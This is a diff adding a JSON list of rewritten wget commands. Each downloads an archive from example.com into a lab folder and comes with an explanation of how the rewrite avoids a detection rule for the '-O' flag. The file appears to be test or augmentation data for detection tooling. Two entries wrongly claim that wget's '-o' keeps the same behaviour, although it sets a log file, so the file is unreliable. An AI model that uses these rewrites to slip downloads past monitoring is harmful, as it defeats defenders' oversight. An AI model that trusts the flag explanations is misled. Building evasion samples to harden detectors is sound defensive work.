@@ -1,0 +1,14 @@
+[
+  {
+    "output": "wget.exe --output-document=C:\\Lab\\out\\archive.7z http://example.com/file.7z",
+    "explanation": "Reordering: The '-O' flag is replaced with the long option '--output-document' to avoid the suspicious '-O' keyword detection."
+  },
+  {
+    "output": "wget.exe -o C:\\Lab\\out\\archive.7z http://example.com/file.7z",
+    "explanation": "Substitution: The long option '--output-document' is replaced with the short option '-o' to avoid the suspicious '-O' keyword detection."
+  },
+  {
+    "output": "wget.exe http://example.com/file.7z -o C:\\Lab\\out\\archive.7z",
+    "explanation": "Reordering: The '-o' flag is moved after the URL to avoid the suspicious '-O' keyword detection while maintaining the same behavior."
+  }
+]
